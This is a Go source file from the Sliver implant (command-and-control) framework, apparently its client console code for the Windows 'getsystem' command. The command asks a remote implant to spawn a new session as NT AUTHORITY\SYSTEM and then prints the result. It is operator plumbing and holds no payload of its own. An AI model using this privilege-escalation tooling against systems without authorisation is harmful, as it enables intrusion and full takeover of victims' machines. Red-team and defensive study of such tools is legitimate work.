package privilege

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"google.golang.org/protobuf/proto"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// GetSystemCmd - Windows only, attempt to get SYSTEM on the remote system
func GetSystemCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	targetOS := getOS(session, beacon)
	if targetOS != "windows" {
		con.PrintErrorf("Command only supported on Windows.\n")
		return
	}

	process, _ := cmd.Flags().GetString("process")
	config := con.GetActiveSessionConfig()

	/* If the HTTP C2 Config name is not defined, then put in the default value
	   This will have no effect on implants that do not use HTTP C2
	   Also this should be overridden when the build info is pulled from the
	   database, but if there is no build info and we have to create the build
	   from scratch, we need to have something in here.
	*/
	if config.HTTPC2ConfigName == "" {
		config.HTTPC2ConfigName = consts.DefaultC2Profile
	}

	ctrl := make(chan bool)
	con.SpinUntil("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)

	getSystem, err := con.Rpc.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        con.ActiveTarget.Request(cmd),
		Config:         config,
		HostingProcess: process,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if getSystem.Response != nil && getSystem.Response.Async {
		con.AddBeaconCallback(getSystem.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, getSystem)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintGetSystem(getSystem, con)
		})
		con.PrintAsyncResponse(getSystem.Response)
	} else {
		PrintGetSystem(getSystem, con)
	}
}

// PrintGetSystem - Print the results of get system
func PrintGetSystem(getsystemResp *sliverpb.GetSystem, con *console.SliverClient) {
	if getsystemResp.Response != nil && getsystemResp.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", getsystemResp.GetResponse().GetErr())
		return
	}
	con.Println()
	con.PrintInfof("A new SYSTEM session should pop soon...\n")
}
